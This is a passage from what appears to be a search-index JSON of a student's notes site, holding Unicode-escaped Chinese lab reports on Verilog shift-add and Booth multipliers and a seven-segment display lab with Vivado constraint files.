\u4f4d\u79fb\u4f4d\u76f8\u52a0\u6709\u7b26\u53f7\u4e58\u6cd5\u5668 \u6309\u7167\u79fb\u4f4d\u76f8\u52a0\u7684\u539f\u7406\uff0c\u4f7f\u7528 verilog \u7f16\u5199 32 \u4f4d\u4e58\u6cd5\u5668 \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u4e58\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5 32 \u4f4d Booth \u4e58\u6cd5\u5668 \u6309\u7167 Booth Algorithm\uff0c\u4f7f\u7528 verilog \u7f16\u5199 32 \u4f4d\u4e58\u6cd5\u5668 \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u4e58\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab2-2/#32","text":"","title":"32 \u4f4d\u79fb\u4f4d\u76f8\u52a0\u6709\u7b26\u53f7\u4e58\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-2/#_3","text":"\u79fb\u4f4d\u76f8\u52a0\u4e58\u6cd5\u5668\u7684\u539f\u7406\u5c31\u662f\u8fdb\u884c\u4f4d\u6570\u6b21\u5faa\u73af\uff0c\u6bcf\u6b21\u5faa\u73af\u68c0\u67e5 multiplier \u7684\u6700\u4f4e\u4f4d\uff0c\u5982\u679c\u662f 1\uff0c\u5c06\u4e58\u6cd5\u7ed3\u679c\u52a0\u4e0a multiplicand\uff0c\u662f 0 \u5c31\u4e0d\u8fdb\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4e4b\u540e\u5c06 multiplicand \u5de6\u79fb\u4e00\u4f4d\uff0cmultiplier \u53f3\u79fb\u4e00\u4f4d\u7136\u540e\u7ee7\u7eed\u5faa\u73af\u3002 \u5728 verilog \u4e2d\u53ef\u4ee5\u4f7f\u7528 always @(*) \u6765\u521b\u5efa\u4e00\u4e2a\u4e32\u884c\u8fd0\u884c\u7684\u5757\uff0c\u76f4\u63a5\u5728\u5176\u4e2d\u6309\u7167\u79fb\u4f4d\u76f8\u52a0\u7684\u903b\u8f91\u8fdb\u884c\u8fd0\u7b97\u5373\u53ef\u3002\u5e76\u4e14\u8981\u5148\u5224\u65ad\u4e00\u4e0b\u6b63\u8d1f\uff0c\u5982\u679c\u662f\u8d1f\u7684\uff08\u6700\u9ad8\u4f4d\u4e3a 1\uff09\u5219\u8981\u5148\u53d6\u53cd\u52a0\u4e00\uff08\u5373\u53d6\u7edd\u5bf9\u503c\uff09\uff0c\u5e76\u4e14\u4e5f\u8981\u5224\u65ad\u7ed3\u679c\u7684\u6b63\u8d1f\u3002\u4ee3\u7801\uff1a module ShiftAddMultiplier ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 63 : 0 ] P ); integer i ; reg [ 31 : 0 ] multiplicand ; reg [ 31 : 0 ] multiplier ; reg [ 63 : 0 ] prod ; wire A_sign , B_sign , P_sign ; assign A_sign = A [ 31 ]; assign B_sign = B [ 31 ]; assign P_sign = A_sign ^ B_sign ; always @( * ) begin multiplicand = A_sign ? ~ A + 1 : A ; multiplier = B_sign ? ~ B + 1 : B ; prod = 0 ; for ( i = 0 ; i < 32 ; i = i + 1 ) begin if ( multiplier [ 0 ] == 1 'b1 ) begin prod = prod + multiplicand ; end multiplicand = multiplicand << 1 ; multiplier = multiplier >> 1 ; end end assign P = P_sign ? ~ prod + 1 : prod ; endmodule","title":"\u601d\u8def\u53ca\u4ee3\u7801"},{"location":"cs/system/cs1/lab2-2/#_4","text":"\u5305\u542b\u4e94\u7ec4\u6d4b\u8bd5\u6837\u4f8b\u7684 test bench\uff1a module TestMultiplier (); reg [ 31 : 0 ] A ; reg [ 31 : 0 ] B ; wire [ 63 : 0 ] P ; ShiftAddMultiplier multiplier ( . A ( A ), . B ( B ), . P ( P ) ); initial begin A = 32'h00000001 ; B = 32'h00000002 ; # 200 A = 32'h00000002 ; B = 32'h00000005 ; # 200 A = 32'h00000009 ; B = 32'h00000009 ; # 200 A = - 14 ; B = 12 ; # 200 A = - 123 ; B = - 456 ; end endmodule \u4eff\u771f\u7ed3\u679c\uff1a \u53ef\u4ee5\u770b\u51fa\u5de5\u4f5c\u6b63\u5e38\u3002","title":"\u4eff\u771f\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab2-2/#_5","text":"\u548c lab 2-1 \u7c7b\u4f3c\uff0c\u5728\u9876\u5c42\u6a21\u5757\u4e2d\u8fde\u5165\u4e58\u6cd5\u5668\uff1a module Top ( input RSTN , clk_100mhz , input BTNL , BTNR , BTNU , BTND , BTNC , input [ 15 : 0 ] SW , output [ 15 : 0 ] LED , output [ 7 : 0 ] SEGMENT , AN ); wire rst = ~ RSTN ; assign LED = SW ; wire [ 31 : 0 ] Ai , Bi ; wire [ 31 : 0 ] sum ; wire [ 63 : 0 ] prod ; ENV env ( . clk ( clk_100mhz ), . rst ( rst ), . SW ( SW ), . BTNL ( BTNL ), . BTNR ( BTNR ), . BTNU ( BTNU ), . BTND ( BTND ), . BTNC ( BTNC ), . SEGMENT ( SEGMENT ), . AN ( AN ), . Ai ( Ai ), . Bi ( Bi ), . SUM ( sum ), . MUL ( prod ) ); CarryLookaheadAdder adder ( . A ( Ai ), . B ( Bi ), . S ( sum ) ); ShiftAddMultiplier multiplier ( . A ( Ai ), . B ( Bi ), . P ( prod ) ); endmodule \u4e0a\u677f\u6d4b\u8bd5\u540e\u4e5f\u90fd\u6309\u7167\u6b63\u5e38\u5de5\u4f5c\u3002","title":"\u4e0a\u677f\u9a8c\u8bc1"},{"location":"cs/system/cs1/lab2-2/#32-booth","text":"","title":"32 \u4f4d Booth \u4e58\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-2/#_6","text":"\u6309\u7167\u7ed9\u51fa\u7684 Booth Algorithm \u6d41\u7a0b\uff0c\u5373\uff1a - A = {multiplicand[31], multiplicand, 33'b0} - S = {-{multiplicand[31], multiplicand}, 33'b0} - P = {33'b0, multiplier, 0} - \u5faa\u73af 32 \u6b21\uff1a - \u5982\u679c P[1:0] \u4e3a 2'b10\uff1aP = P + S - \u5982\u679c P[1:0] \u4e3a 2'b01\uff1aP = P + A - \u5982\u679c P[1:0] \u4e3a 2'b00\u30012'b11\uff1a\u4e0d\u53d8 - P \u7b97\u672f\u53f3\u79fb\u4e00\u4f4d - P[64:1] \u5373\u4e3a\u4e58\u6cd5\u7ed3\u679c \u6309\u7167\u8fd9\u4e2a\u601d\u8def\uff0c\u5728 always @(*) \u5757\u4e2d\u8fdb\u884c\u8fd0\u7b97\u5c31\u53ef\u4ee5\u5f97\u5230\u4e58\u6cd5\u7ed3\u679c\uff0c\u4ee3\u7801\uff1a module BoothMultiplier ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 63 : 0 ] P ); reg [ 65 : 0 ] a , s , p ; integer i ; always @( * ) begin a [ 31 : 0 ] = A ; a [ 32 ] = a [ 31 ]; a = a << 33 ; s = 0 ; s [ 31 : 0 ] = A ; s [ 32 ] = s [ 31 ]; s = ~ s + 1 ; s = s << 33 ; p = 0 ; p [ 32 : 1 ] = B ; for ( i = 0 ; i < 32 ; i = i + 1 ) begin if ( p [ 1 : 0 ] == 2 'b10 ) begin p = p + s ; end else if ( p [ 1 : 0 ] == 2 'b01 ) begin p = p + a ; end p = ( $signed ( p )) >>> 1 ; end end assign P = p [ 64 : 1 ]; endmodule","title":"\u601d\u8def\u53ca\u4ee3\u7801"},{"location":"cs/system/cs1/lab2-2/#_7","text":"\u548c lab 2-1 \u4ee5\u53ca\u524d\u9762\u79fb\u4f4d\u76f8\u52a0\u4e58\u6cd5\u5668\u540c\u7406\uff0c\u5c06\u5176\u4e2d\u4e58\u6cd5\u5668\u5b9e\u4f8b\u5316\u90e8\u5206\u6362\u4e3a\uff1a BoothMultiplier multiplier ( . A ( A ), . B ( B ), . P ( P ) ); \u5373\u53ef\u5b8c\u6210\u5bf9 Booth \u4e58\u6cd5\u5668\u7684\u4eff\u771f\u4ee5\u53ca\u4e0a\u677f\u9a8c\u8bc1\uff0c\u4eff\u771f\u7ed3\u679c\uff1a \u8fd0\u884c\u6b63\u786e\uff0c\u5e76\u4e14\u4e0a\u677f\u9a8c\u8bc1\u540e\u4e5f\u6309\u7167\u9884\u671f\u5de5\u4f5c\u3002","title":"\u4eff\u771f\u6d4b\u8bd5\u53ca\u4e0a\u677f\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab3/","text":"\u4e03\u6bb5\u7ba1\u663e\u793a\u5668 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082022.04.16 ~ 2022.04.29\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u7406\u89e3\u7ea6\u675f\u6587\u4ef6\uff0c\u6dfb\u52a0\u5f00\u5173\u63a7\u5236 \u6253\u5f00 Vivado \u8f6f\u4ef6\uff0c\u6309\u7167\u5b9e\u9a8c 1 \u7684\u52a0\u5165\u6587\u4ef6\u65b9\u5f0f\uff0c\u52a0\u5165\u6240\u6709\u7684 .v \u6587\u4ef6\u548c .xdc \u6587\u4ef6 \u6837\u4f8b\u4e2d\u5df2\u7ecf\u5c06\u4e03\u6bb5\u7ba1\u548c\u65f6\u949f\u53ca rst \u8bbe\u8ba1\u597d \u5237\u5165\u677f\u5b50\u540e\uff0c\u53d1\u73b0\u677f\u5b50\u95f4\u63a5\u6027\u95ea\u70c1 FFFFFFFF\uff0c\u7531\u4e8e\u6ca1\u6709\u5f00\u5173\u8f93\u5165\uff0c\u6240\u4ee5\u6837\u4f8b\u4e2d\u5c06\u6240\u6709\u7684\u8f93\u5165\u90fd\u8bbe\u7f6e\u4e3a\u4e86 F \u7406\u89e3\u73b0\u6709\u7684 xdc \u6587\u4ef6\uff0c\u7136\u540e\u8bf7\u6dfb\u52a0 R15,M13,L16,J15 \u5f00\u5173\u5230\u7ea6\u675f\u6587\u4ef6\u3002 \u7406\u89e3\u65f6\u949f\u5206\u9891\uff0c\u964d\u4f4e\u95ea\u70c1\u901f\u5ea6 \u672c\u6b21\u5b9e\u9a8c\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e00\u4e2a\u8f83\u4e3a\u7b80\u5355\u7684\u65f6\u949f\u5206\u9891\u4f7f\u5f97\u95ea\u70c1\u901f\u5ea6\u63a5\u8fd1 1s \u4e00\u6b21 \u7406\u89e3\u539f\u6709\u7684\u4ee3\u7801\uff0c\u8ba9\u95ea\u70c1\u6d88\u5931 \u4e03\u6bb5\u7ba1\u7684\u8bd1\u7801\u5668 \u76ee\u524d\u5c1a\u672a\u5b8c\u6210 hex2shape \u7684\u8bd1\u7801\u5668\uff0c\u53ea\u80fd\u5b9e\u73b0\u663e\u793a F \u91cd\u65b0\u4fee\u6539\u4ee3\u7801\uff0c\u4f7f\u5f97\u4e03\u6bb5\u7ba1\u53ef\u4ee5\u663e\u793a 0-9 \u5c06 R15,M13,L16,J15 \u5f00\u5173\u548c\u8f93\u5165\u4fe1\u53f7\u76f8\u5173\u8054\uff0c\u4f7f\u5f97\u66f4\u6539\u5f00\u5173\u53ef\u4ee5\u6539\u53d8\u95ea\u70c1\u7684\u4e03\u6bb5\u7ba1\u663e\u793a \u9700\u8981\u5b9e\u73b0\u7684\u90e8\u5206\u5df2\u7528\u6ce8\u91ca\u6807\u51fa Bonus\uff1a\u4e03\u6bb5\u7ba1\u6269\u5c55 \u5b8c\u6210 AbCdEF \u7684\u989d\u5916\u663e\u793a \u7ea6\u675f\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5f00\u5173\u63a7\u5236 \u00b6 \u601d\u8def\u53ca\u4ee3\u7801 \u00b6 \u53ef\u4ee5\u53d1\u73b0\u7ea6\u675f\u6587\u4ef6\u4e2d\u5bf9\u5e94\u5f15\u811a\u548c\u53d8\u91cf\u7684\u8bed\u53e5\u90fd\u662f\u5982\u4e0b\u5f62\u5f0f\uff1a set_property PACKAGE_PIN \u5f15\u811a [ get_ports { \u53d8\u91cf }] set_property IOSTANDARD LVCMOS33 [ get_ports { \u53d8\u91cf }] \u6240\u4ee5\u6dfb\u52a0\u5f00\u5173\u63a7\u5236\u9700\u8981\u5148\u5728 Top.v \u9876\u5c42\u6a21\u5757\u4e2d\u589e\u52a0 SW \u8f93\u5165\uff1a module Top ( input sys_clk , input rstn , input [ 3 : 0 ] SW , // \u56db\u4e2a\u5f00\u5173 output [ 7 : 0 ] num_csn , output [ 7 : 0 ] num_an ); \u7136\u540e\u5728 xdc \u7ea6\u675f\u6587\u4ef6\u4e2d\u52a0\u5165\uff1a set_property PACKAGE_PIN R15 [ get_ports { SW [ 3 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 3 ]}] set_property PACKAGE_PIN M13 [ get_ports { SW [ 2 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 2 ]}] set_property PACKAGE_PIN L16 [ get_ports { SW [ 1 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 1 ]}] set_property PACKAGE_PIN J15 [ get_ports { SW [ 0 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 0 ]}] \u5373\u4ece\u5de6\u5230\u53f3 R15,M13,L16,J15 \u4f9d\u6b21\u5bf9\u5e94 SW \u7684\u4ece\u9ad8\u5230\u4f4e\u4f4d \u53d6\u6d88\u95ea\u70c1 \u00b6 \u601d\u8def\u53ca\u4ee3\u7801 \u00b6 counter.v \u4e2d\u662f\u65f6\u949f\u63a7\u5236\u903b\u8f91\uff1a module counter ( input wire clk , // clock input wire rstn , // RESET Low Enable output reg [ 31 : 0 ] clkn // clock number [32 bits] ); always @ ( posedge clk ) begin if ( rstn ) clkn <= clkn + 1 ; // clkn ++ else clkn <= 0 ; // clkn reset end endmodule \u5373\u6bcf\u4e00\u4e2a clk \u65f6\u949f\u4e0a\u5347\u6cbf\u589e\u52a0\u4e00\u6b21 clkn\u3002\u7136\u540e\u5728 Top.v \u4e2d\u6709\u63a7\u5236\u5237\u65b0\u7684\u90e8\u5206\u903b\u8f91\uff1a assign flash_clk = clkn [ 25 ]; always @( posedge flash_clk ) begin // data_src <= ... end \u4e5f\u5c31\u662f\u5f53 clkn \u7684\u7b2c 25 \u4f4d\u4ece 0 \u53d8\u4e3a 1 \u65f6\uff08\u5373 flash_clk \u4e0a\u5347\u6cbf\uff09\u6267\u884c\u5bf9\u4e8e data_src \u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u5237\u65b0\u3002\u6240\u4ee5\u53d6\u6d88\u95ea\u70c1\u53ea\u8981\u4f7f\u5237\u65b0\u901f\u5ea6\u52a0\u5feb\u5230\u4eba\u773c\u96be\u4ee5\u5206\u8fa8\u3002\u4e5f\u5c31\u662f\u8ba9 flash_clk \u8bb0\u5f55 clkn \u66f4\u4f4e\u4f4d\u7684\u6bd4\u7279\uff1a assign flash_clk = clkn [ 15 ]; \u4e03\u6bb5\u7ba1\u7684\u8bd1\u7801\u5668 \u00b6 \u4ece\u63d0\u4f9b\u7684\u6587\u4ef6\u4e2d\u53ef\u4ee5\u770b\u51fa\u9700\u8981\u5b9e\u73b0\u7684\u662f hex2shape.v \u4e2d\u7684 hex_to_shape \u6a21\u5757\uff0c\u4ee5\u53ca Top.v \u4e2d\u5c06\u5f00\u5173\u8f93\u5165\u4e0e data_src \u76f8\u8fde\u63a5 hex_to_shape \u00b6 \u601d\u8def \u00b6 module hex_to_shape ( input [ 3 : 0 ] hex , output [ 7 : 0 ] shape ); \u53ea\u9700\u8981\u5b9e\u73b0\u6839\u636e hex \u6765\u5bf9 shape \u8fdb\u884c\u8d4b\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f shape \u7684\u987a\u5e8f\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u4f9d\u6b21\u8868\u793a\u4e03\u6bb5\u7ba1\u7684 A~G \u4ee5\u53ca\u5c0f\u6570\u70b9 DP\uff1a \u5e76\u4e14\u7531\u4e8e\u4e03\u6bb5\u7ba1\u662f\u4f4e\u7535\u5e73\u9a71\u52a8\uff0c\u6240\u4ee5\u5404\u4e2a\u4f4d\u7f6e\u4e0a 0 \u8868\u793a\u70b9\u4eae\uff0c1 \u8868\u793a\u7184\u706d \u4ee3\u7801 \u00b6 \u6839\u636e\u5404\u4e2a\u663e\u793a\u7684\u6570\u5b57\u5b57\u6bcd\u7684\u5f62\u72b6\u6765\u5199\u51fa shape\uff0c\u8fd9\u91cc\u76f4\u63a5\u987a\u52bf\u5b8c\u6210\u4e86\u5bf9\u4e8e A~F \u7684\u652f\u6301 module hex_to_shape ( input [ 3 : 0 ] hex , output [ 7 : 0 ] shape ); reg [ 7 : 0 ] shape_reg ; // \u9700\u8981\u4e00\u4e2a register \u6765\u5728 case \u8bed\u53e5\u4e2d\u8d4b\u503c assign shape = shape_reg ; always @( * ) begin case ( hex ) // case \u5404\u79cd hex \u60c5\u51b5 4'h0 : begin shape_reg <= 8 'b11000000 ; end 4'h1 : begin shape_reg <= 8 'b11111001 ; end 4'h2 : begin shape_reg <= 8 'b10100100 ; end 4'h3 : begin shape_reg <= 8 'b10110000 ; end 4'h4 : begin shape_reg <= 8 'b10011001 ; end 4'h5 : begin shape_reg <= 8 'b10010010 ; end 4'h6 : begin shape_reg <= 8 'b10000010 ; end 4'h7 : begin shape_reg <= 8 'b11111000 ; end 4'h8 : begin shape_reg <= 8 'b10000000 ; end 4'h9 : begin shape_reg <= 8 'b10010000 ; end 4'hA : begin shape_reg <= 8 'b10001000 ; end 4'hB : begin shape_reg <= 8 'b10000011 ; end 4'hC : begin shape_reg <= 8 'b11000110 ; end 4'hD : begin shape_reg <= 8 'b10100001 ; end 4'hE : begin shape_reg <= 8 'b10000110 ; end 4'hF : begin shape_reg <= 8 'b10001110 ; end default : begin shape_reg <= 8 'b11111111 ; end // \u867d\u7136\u4e0d\u4f1a\u89e6\u53d1\uff0c\u4f46\u8fd8\u662f\u5199\u4e86\u4e00\u4e2a\u4e0d\u663e\u793a\u7684 default endcase end endmodule \u5173\u8054\u5f00\u5173\u8f93\u5165\u4e0e data_src \u00b6 \u601d\u8def \u00b6 \u7ed9\u51fa\u7684\u793a\u4f8b\u90e8\u5206\u662f\uff1a always @( posedge flash_clk ) begin // 32'h00000000 <-> 32'hffffffff if ( rstn ) data_src <= ~ data_src ; else data_src <= 0 ; end \u4e5f\u5c31\u662f\u5f53 rstn \u4e3a 1 \u7684\u65f6\u5019\uff0cdata_src \u88ab\u8d4b\u503c\u4e3a 32'hffffffff\uff0c\u6240\u4ee5\u8fd9\u4e2a\u91cc\u9762\u662f\u8981\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u7684\u4f4d\u7f6e\uff0c\u800c\u4e0b\u9762\u7684 else \u5219\u662f\u590d\u4f4d\u65f6\u8fdb\u884c\u7684\u8d4b\u503c\u64cd\u4f5c \u4ee3\u7801 \u00b6 \u6211\u8fd9\u91cc\u5c06\u516b\u4e2a\u4e03\u6bb5\u7ba1\u663e\u793a\u4e3a\u540c\u6837\u7684\u5b57\u7b26\uff0c\u90fd\u7531 SW \u63a7\u5236\uff1a always @( posedge flash_clk ) begin if ( rstn ) begin data_src [ 31 : 28 ] <= SW [ 3 : 0 ]; data_src [ 27 : 24 ] <= SW [ 3 : 0 ]; data_src [ 23 : 20 ] <= SW [ 3 : 0 ]; data_src [ 19 : 16 ] <= SW [ 3 : 0 ]; data_src [ 15 : 12 ] <= SW [ 3 : 0 ]; data_src [ 11 : 8 ] <= SW [ 3 : 0 ]; data_src [ 7 : 4 ] <= SW [ 3 : 0 ]; data_src [ 3 : 0 ] <= SW [ 3 : 0 ]; end else data_src <= 0 ; end \u4e0a\u677f\u6d4b\u8bd5 \u00b6 \u8fdb\u884c\u6240\u6709\u4fee\u6539\u540e\u8fdb\u884c\u4e86\u4e0a\u677f\u9a8c\u8bc1\uff0c\u5747\u6309\u7167\u9884\u671f\u663e\u793a\uff0c\u4e00\u5207\u6b63\u5e38\u3002","title":"\u7cfb\u7edf I lab3"},{"location":"cs/system/cs1/lab3/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082022.04.16 ~ 2022.04.29\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u4e03\u6bb5\u7ba1\u663e\u793a\u5668"},{"location":"cs/system/cs1/lab3/#_2","text":"\u7406\u89e3\u7ea6\u675f\u6587\u4ef6\uff0c\u6dfb\u52a0\u5f00\u5173\u63a7\u5236 \u6253\u5f00 Vivado \u8f6f\u4ef6\uff0c\u6309\u7167\u5b9e\u9a8c 1 \u7684\u52a0\u5165\u6587\u4ef6\u65b9\u5f0f\uff0c\u52a0\u5165\u6240\u6709\u7684 .v \u6587\u4ef6\u548c .xdc \u6587\u4ef6 \u6837\u4f8b\u4e2d\u5df2\u7ecf\u5c06\u4e03\u6bb5\u7ba1\u548c\u65f6\u949f\u53ca rst \u8bbe\u8ba1\u597d \u5237\u5165\u677f\u5b50\u540e\uff0c\u53d1\u73b0\u677f\u5b50\u95f4\u63a5\u6027\u95ea\u70c1 FFFFFFFF\uff0c\u7531\u4e8e\u6ca1\u6709\u5f00\u5173\u8f93\u5165\uff0c\u6240\u4ee5\u6837\u4f8b\u4e2d\u5c06\u6240\u6709\u7684\u8f93\u5165\u90fd\u8bbe\u7f6e\u4e3a\u4e86 F \u7406\u89e3\u73b0\u6709\u7684 xdc \u6587\u4ef6\uff0c\u7136\u540e\u8bf7\u6dfb\u52a0 R15,M13,L16,J15 \u5f00\u5173\u5230\u7ea6\u675f\u6587\u4ef6\u3002 \u7406\u89e3\u65f6\u949f\u5206\u9891\uff0c\u964d\u4f4e\u95ea\u70c1\u901f\u5ea6 \u672c\u6b21\u5b9e\u9a8c\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e00\u4e2a\u8f83\u4e3a\u7b80\u5355\u7684\u65f6\u949f\u5206\u9891\u4f7f\u5f97\u95ea\u70c1\u901f\u5ea6\u63a5\u8fd1 1s \u4e00\u6b21 \u7406\u89e3\u539f\u6709\u7684\u4ee3\u7801\uff0c\u8ba9\u95ea\u70c1\u6d88\u5931 \u4e03\u6bb5\u7ba1\u7684\u8bd1\u7801\u5668 \u76ee\u524d\u5c1a\u672a\u5b8c\u6210 hex2shape \u7684\u8bd1\u7801\u5668\uff0c\u53ea\u80fd\u5b9e\u73b0\u663e\u793a F \u91cd\u65b0\u4fee\u6539\u4ee3\u7801\uff0c\u4f7f\u5f97\u4e03\u6bb5\u7ba1\u53ef\u4ee5\u663e\u793a 0-9 \u5c06 R15,M13,L16,J15 \u5f00\u5173\u548c\u8f93\u5165\u4fe1\u53f7\u76f8\u5173\u8054\uff0c\u4f7f\u5f97\u66f4\u6539\u5f00\u5173\u53ef\u4ee5\u6539\u53d8\u95ea\u70c1\u7684\u4e03\u6bb5\u7ba1\u663e\u793a \u9700\u8981\u5b9e\u73b0\u7684\u90e8\u5206\u5df2\u7528\u6ce8\u91ca\u6807\u51fa Bonus\uff1a\u4e03\u6bb5\u7ba1\u6269\u5c55 \u5b8c\u6210 AbCdEF \u7684\u989d\u5916\u663e\u793a","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab3/#_3","text":"","title":"\u7ea6\u675f\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5f00\u5173\u63a7\u5236"},{"location":"cs/system/cs1/lab3/#_4","text":"\u53ef\u4ee5\u53d1\u73b0\u7ea6\u675f\u6587\u4ef6\u4e2d\u5bf9\u5e94\u5f15\u811a\u548c\u53d8\u91cf\u7684\u8bed\u53e5\u90fd\u662f\u5982\u4e0b\u5f62\u5f0f\uff1a set_property PACKAGE_PIN \u5f15\u811a [ get_ports { \u53d8\u91cf }] set_property IOSTANDARD LVCMOS33 [ get_ports { \u53d8\u91cf }] \u6240\u4ee5\u6dfb\u52a0\u5f00\u5173\u63a7\u5236\u9700\u8981\u5148\u5728 Top.v \u9876\u5c42\u6a21\u5757\u4e2d\u589e\u52a0 SW \u8f93\u5165\uff1a module Top ( input sys_clk , input rstn , input [ 3 : 0 ] SW , // \u56db\u4e2a\u5f00\u5173 output [ 7 : 0 ] num_csn , output [ 7 : 0 ] num_an ); \u7136\u540e\u5728 xdc \u7ea6\u675f\u6587\u4ef6\u4e2d\u52a0\u5165\uff1a set_property PACKAGE_PIN R15 [ get_ports { SW [ 3 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 3 ]}] set_property PACKAGE_PIN M13 [ get_ports { SW [ 2 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 2 ]}] set_property PACKAGE_PIN L16 [ get_ports { SW [ 1 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 1 ]}] set_property PACKAGE_PIN J15 [ get_ports { SW [ 0 ]}] set_property IOSTANDARD LVCMOS33 [ get_ports { SW [ 0 ]}] \u5373\u4ece\u5de6\u5230\u53f3 R15,M13,L16,J15 \u4f9d\u6b21\u5bf9\u5e94 SW \u7684\u4ece\u9ad8\u5230\u4f4e\u4f4d","title":"\u601d\u8def\u53ca\u4ee3\u7801"},{"location":"cs/system/cs1/lab3/#_5","text":"","title":"\u53d6\u6d88\u95ea\u70c1"},{"location":"cs/system/cs1/lab3/#_6","text":"counter.v \u4e2d\u662f\u65f6\u949f\u63a7\u5236\u903b\u8f91\uff1a module counter ( input wire clk , // clock input wire rstn , // RESET Low Enable output reg [ 31 : 0 ] clkn // clock number [32 bits] ); always @ ( posedge clk ) begin if ( rstn ) clkn <= clkn + 1 ; // clkn ++ else clkn <= 0 ; // clkn reset end endmodule \u5373\u6bcf\u4e00\u4e2a clk \u65f6\u949f\u4e0a\u5347\u6cbf\u589e\u52a0\u4e00\u6b21 clkn\u3002\u7136\u540e\u5728 Top.v \u4e2d\u6709\u63a7\u5236\u5237\u65b0\u7684\u90e8\u5206\u903b\u8f91\uff1a assign flash_clk = clkn [ 25 ]; always @( posedge flash_clk ) begin // data_src <= ... end \u4e5f\u5c31\u662f\u5f53 clkn \u7684\u7b2c 25 \u4f4d\u4ece 0 \u53d8\u4e3a 1 \u65f6\uff08\u5373 flash_clk \u4e0a\u5347\u6cbf\uff09\u6267\u884c\u5bf9\u4e8e data_src \u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u5237\u65b0\u3002\u6240\u4ee5\u53d6\u6d88\u95ea\u70c1\u53ea\u8981\u4f7f\u5237\u65b0\u901f\u5ea6\u52a0\u5feb\u5230\u4eba\u773c\u96be\u4ee5\u5206\u8fa8\u3002\u4e5f\u5c31\u662f\u8ba9 flash_clk \u8bb0\u5f55 clkn \u66f4\u4f4e\u4f4d\u7684\u6bd4\u7279\uff1a assign flash_clk = clkn [ 15 ];","title":"\u601d\u8def\u53ca\u4ee3\u7801"},{"location":"cs/system/cs1/lab3/#_7","text":"\u4ece\u63d0\u4f9b\u7684\u6587\u4ef6\u4e2d\u53ef\u4ee5\u770b\u51fa\u9700\u8981\u5b9e\u73b0\u7684\u662f hex2shape.v \u4e2d\u7684 hex_to_shape \u6a21\u5757\uff0c\u4ee5\u53ca Top.v \u4e2d\u5c06\u5f00\u5173\u8f93\u5165\u4e0e data_src \u76f8\u8fde\u63a5","title":"\u4e03\u6bb5\u7ba1\u7684\u8bd1\u7801\u5668"},{"location":"cs/system/cs1/lab3/#hex_to_shape","text":"","title":"hex_to_shape"},{"location":"cs/system/cs1/lab3/#_8","text":"module hex_to_shape ( input [ 3 : 0 ] hex , output [ 7 : 0 ] shape ); \u53ea\u9700\u8981\u5b9e\u73b0\u6839\u636e hex \u6765\u5bf9 shape \u8fdb\u884c\u8d4b\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f shape \u7684\u987a\u5e8f\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u4f9d\u6b21\u8868\u793a\u4e03\u6bb5\u7ba1\u7684 A~G \u4ee5\u53ca\u5c0f\u6570\u70b9 DP\uff1a \u5e76\u4e14\u7531\u4e8e\u4e03\u6bb5\u7ba1\u662f\u4f4e\u7535\u5e73\u9a71\u52a8\uff0c\u6240\u4ee5\u5404\u4e2a\u4f4d\u7f6e\u4e0a 0 \u8868\u793a\u70b9\u4eae\uff0c1 \u8868\u793a\u7184\u706d","title":"\u601d\u8def"},{"location":"cs/system/cs1/lab3/#_9","text":"\u6839\u636e\u5404\u4e2a\u663e\u793a\u7684\u6570\u5b57\u5b57\u6bcd\u7684\u5f62\u72b6\u6765\u5199\u51fa shape\uff0c\u8fd9\u91cc\u76f4\u63a5\u987a\u52bf\u5b8c\u6210\u4e86\u5bf9\u4e8e A~F \u7684\u652f\u6301 module hex_to_shape ( input [ 3 : 0 ] hex , output [ 7 : 0 ] shape ); 